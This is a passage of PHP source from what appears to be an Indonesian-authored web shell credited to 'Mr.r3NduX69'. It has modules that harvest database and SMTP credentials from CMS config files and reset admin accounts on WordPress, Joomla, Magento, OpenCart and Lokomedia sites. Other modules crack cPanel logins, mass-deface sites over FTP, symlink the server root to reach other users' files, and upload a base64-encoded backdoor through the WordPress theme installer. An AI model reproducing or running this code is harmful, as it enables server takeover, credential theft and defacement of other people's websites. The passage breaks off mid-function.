            echo "username atau password harus lebih dari 6 karakter";
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach($scan_conf as $file_conf) {
                if(!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if(preg_match("/JConfig|joomla/",$config)) {
                    $dbhost = ambilkata($config,"host = '","'");
                    $dbuser = ambilkata($config,"user = '","'");
                    $dbpass = ambilkata($config,"password = '","'");
                    $dbname = ambilkata($config,"db = '","'");
                    $dbprefix = ambilkata($config,"dbprefix = '","'");
                    $prefix = $dbprefix."users";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config,"sitename = '","'");
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Joomla<br>";
                    if($site == '') {
                        echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
                    } else {
                        echo "Sitename => $site<br>";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/WordPress/",$config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."users";
                    $option = $dbprefix."options";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Wordpress<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/Magento|Mage_Core/",$config)) {
                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                    $prefix = $dbprefix."admin_user";
                    $option = $dbprefix."core_config_data";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Magento<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
                    $prefix = $dbprefix."user";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $target = ambilkata($config,"HTTP_SERVER', '","'");
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => OpenCart<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                    $dbhost = ambilkata($config,'server = "','"');
                    $dbuser = ambilkata($config,'username = "','"');
                    $dbpass = ambilkata($config,'password = "','"');
                    $dbname = ambilkata($config,'database = "','"');
                    $prefix = "users";
                    $option = "identitas";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                    $result = mysql_fetch_array($q);
                    $target = $result[alamat_website];
                    if($target == '') {
                        $target2 = $result[url];
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        if($target2 == '') {
                            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $cek_login3 = file_get_contents("$target2/adminweb/");
                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                            }
                        }
                    } else {
                        $cek_login = file_get_contents("$target/adminweb/");
                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                        if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                        } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                        }
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Lokomedia<br>";
                    if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
                        echo $url_target2;
                    } else {
                        echo $url_target;
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit User Config</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='restu' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='restu' placeholder='pass_baru'><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
} elseif($_GET['do'] == 'cpanel') {
    if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
            foreach($passcp as $pcp) {
                if(@mysql_connect('localhost', $ucp, $pcp)) {
                    if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                    } else {
                        $_SESSION[$ucp] = "1";
                        $_SESSION[$pcp] = "1";
                        if($ucp == '' || $pcp == '') {
                           
                        } else {
                            $i++;
                            if(function_exists('posix_getpwuid')) {
                                $domain_cp = file_get_contents("/etc/named.conf"); 
                                if($domain_cp == '') {
                                    $dom =  "<font color=red>gabisa ambil nama domain nya</font>";
                                } else {
                                    preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                    foreach($domains_cp[1] as $dj) {
                                        $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                        $user_cp_url = $user_cp_url['name'];
                                        if($user_cp_url == $ucp) {
                                            $dom = "<a href='http://$dj/' target='_blank'><font color=blue>$dj</font></a>";
                                            break;
                                        }
                                    }
                                }
                            } else {
                                $dom = "<font color=red>function is Disable by system</font>";
                            }
                            echo "username (<font color=blue>$ucp</font>) password (<font color=blue>$pcp</font>) domain ($dom)<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>sukses nyolong ".$i." Cpanel by <font color=blue>Mr.r3NduX69</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
            if($getu == '' || !$_usercp) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all("/(.*?):x:/", $getu, $u);
                foreach($u[1] as $user_cp) {
                        if(is_dir("/home/$user_cp/public_html")) {
                            echo "$user_cp\n";
                    }
                }
            }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
            $pass = "";
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                if(preg_match("/WordPress/", $ambil)) {
                    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                    $pass .= ambilkata($ambil,"password = '","'")."\n";
                } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                    $pass .= ambilkata($ambil,'password = "','"')."\n";
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/^[client]$/", $ambil)) {
                    preg_match("/password=(.*?)/", $ambil, $pass1);
                    if(preg_match('/"/', $pass1[1])) {
                        $pass1[1] = str_replace('"', "", $pass1[1]);
                        $pass .= $pass1[1]."\n";
                    } else {
                        $pass .= $pass1[1]."\n";
                    }
                } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                }
            }
            echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='Crack'>
        </form>
        <span>NB:Work di <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
    }
} elseif($_GET['do'] == 'cpftp_auto') {
    if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
            foreach($passcp as $pcp) {
                if(@mysql_connect('localhost', $ucp, $pcp)) {
                    if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                    } else {
                        $_SESSION[$ucp] = "1";
                        $_SESSION[$pcp] = "1";
                        if($ucp == '' || $pcp == '') {
                            //
                        } else {
                            echo "[+] username (<font color=blue>$ucp</font>) password (<font color=blue>$pcp</font>)<br>";
                            $ftp_conn = ftp_connect($ip);
                            $ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
                            if((!$ftp_login) || (!$ftp_conn)) {
                                echo " <font color=red>Login Gagal</font><br><br>";
                            } else {
                                echo " <font color=blue>Login Sukses</font><br>";
                                $fi = htmlspecialchars($_POST['file_deface']);
                                $deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
                                if($deface) {
                                    $i++;
                                    echo " <font color=blue>Deface Sukses</font><br>";
                                    if(function_exists('posix_getpwuid')) {
                                        $domain_cp = file_get_contents("/etc/named.conf"); 
                                        if($domain_cp == '') {
                                            echo " <font color=red>gabisa ambil nama domain nya</font><br><br>";
                                        } else {
                                            preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                            foreach($domains_cp[1] as $dj) {
                                                $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                                $user_cp_url = $user_cp_url['name'];
                                                if($user_cp_url == $ucp) {
                                                    echo "<a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
                                                    break;
                                                }
                                            }
                                        }
                                    } else {
                                        echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
                                    }
                                } else {
                                    echo "[-] <font color=red>Deface Gagal</font><br><br>";
                                }
                            }
                            //echo "username (<font color=blue>$ucp</font>) password (<font color=blue>$pcp</font>)<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>sukses deface ".$i." Cpanel by <font color=blue>Mr.r3NduX69</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        Filename: <br>
        <input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
        Deface Page: <br>
        <input type='text' name='deface' placeholder='http://www.web-yang-udah-di-deface.com/filemu.php' style='width: 450px;'><br>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
            if($getu == '' || !$_usercp) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all("/(.*?):x:/", $getu, $u);
                foreach($u[1] as $user_cp) {
                        if(is_dir("/home/$user_cp/public_html")) {
                            echo "$user_cp\n";
                    }
                }
            }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
            $pass = "";
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                if(preg_match("/WordPress/", $ambil)) {
                    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                    $pass .= ambilkata($ambil,"password = '","'")."\n";
                } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                    $pass .= ambilkata($ambil,'password = "','"')."\n";
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/client/", $ambil)) {
                    preg_match("/password=(.*)/", $ambil, $pass1);
                    if(preg_match('/"/', $pass1[1])) {
                        $pass1[1] = str_replace('"', "", $pass1[1]);
                        $pass .= $pass1[1]."\n";
                    }
                } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                }
            }
            echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='Genjot...'>
        </form>
        <span>Work Di <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
    }
} elseif($_GET['do'] == 'smtp') {
    echo "<center><span>Work Di <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
    function scj($dir) {
        $dira = scandir($dir);
        foreach($dira as $dirb) {
            if(!is_file("$dir/$dirb")) continue;
            $ambil = file_get_contents("$dir/$dirb");
            $ambil = str_replace("$", "", $ambil);
            if(preg_match("/JConfig|joomla/", $ambil)) {
                $smtp_host = ambilkata($ambil,"smtphost = '","'");
                $smtp_auth = ambilkata($ambil,"smtpauth = '","'");
                $smtp_user = ambilkata($ambil,"smtpuser = '","'");
                $smtp_pass = ambilkata($ambil,"smtppass = '","'");
                $smtp_port = ambilkata($ambil,"smtpport = '","'");
                $smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
                echo "SMTP Host: <font color=blue>$smtp_host</font><br>";
                echo "SMTP port: <font color=blue>$smtp_port</font><br>";
                echo "SMTP user: <font color=blue>$smtp_user</font><br>";
                echo "SMTP pass: <font color=blue>$smtp_pass</font><br>";
                echo "SMTP auth: <font color=blue>$smtp_auth</font><br>";
                echo "SMTP secure: <font color=blue>$smtp_secure</font><br><br>";
            }
        }
    }
    $smpt_hunter = scj($dir);
    echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
    if($_POST['hajar']) {
        $title = htmlspecialchars($_POST['new_title']);
        $pn_title = str_replace(" ", "-", $title);
        if($_POST['cek_edit'] == "Y") {
            $script = $_POST['edit_content'];
        } else {
            $script = $title;
        }
        $conf = $_POST['config_dir'];
        $scan_conf = scandir($conf);
        foreach($scan_conf as $file_conf) {
            if(!is_file("$conf/$file_conf")) continue;
            $config = file_get_contents("$conf/$file_conf");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=blue>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit Title+Content WordPress</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Hacked by Mr.r3NduX69 Indonesian People ' placeholder='New Title'><br><br>
        Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
        <span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
        <textarea name='edit_content' placeholder='contoh script: http://pastebin.com/restu' style='width: 450px; height: 150px;'></textarea><br>
        <input type='submit' name='hajar' value='Genjot..' style='width: 450px;'><br>
        </form>
        <span>Work di <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }

} elseif($_GET['do'] == 'fake_root') {
    ob_start();
    $cwd = getcwd();
    $ambil_user = explode("/", $cwd);
    $user = $ambil_user[2];
    if($_POST['reverse']) {
        $site = explode("\r\n", $_POST['url']);
        $file = $_POST['file'];
        foreach($site as $url) {
            $cek = getsource("$url/~$user/$file");
            if(preg_match("/hacked/i", $cek)) {
                echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=blue>Fake Root!</font><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
        Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
        User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
        Domain: <br>
        <textarea style='width: 450px; height: 250px;' name='url'>";
        reverse($_SERVER['HTTP_HOST']);
        echo "</textarea><br>
        <input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
        </form><br>
        NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
    }
} elseif($_GET['do'] == 'symlink') {
 
@set_time_limit(0);
 
echo "<br><br><center><h1>Symlink</h1></center><br><br><center><div class=content>";
 
@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
$malay  = '\.my';
$china  = '\.cn';
$japan  = '\.jp';
$austr  = '\.au';
$porn   = '\.xxx';
$as     = '\.uk';
$calfn  = '\.ca';
 
if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>
 
<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>
 
<td>
'.$UID['name']."
</td>
 
<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>
 
</tr></div> ";
flush();
}
}
}
}
 
echo "</center></table>";  
} elseif($_GET['do'] == 'auto_dwp') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $scan = $_POST['link_config'];
        $link_config = scandir($scan);
        $script = htmlspecialchars($_POST['script']);
        $user = "global";
        $pass = "global";
        $passx = md5($pass);
        foreach($link_config as $dir_config) {
            if(!is_file("$scan/$dir_config")) continue;
            $config = file_get_contents("$scan/$dir_config");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."users";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                if($target == '') {                
                    echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
                } else {
                    echo "[+] $target <br>";
                }
                $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
                if(!$conn OR !$db OR !$update) {
                    echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                    mysql_close($conn);
                } else {
                    $site = "$target/wp-login.php";
                    $site2 = "$target/wp-admin/theme-install.php?upload";
                    $b1 = anucurl($site2);
                    $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                    $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                    $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                    $upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
                    $www = "m.php";
                    $fp5 = fopen($www,"w");
                    fputs($fp5,$upload3);
                    $post2 = array(
                            "_wpnonce" => "$anu2",
                            "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                            "themezip" => "@$www",
                            "install-theme-submit" => "Install Now",
                            );
                    $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
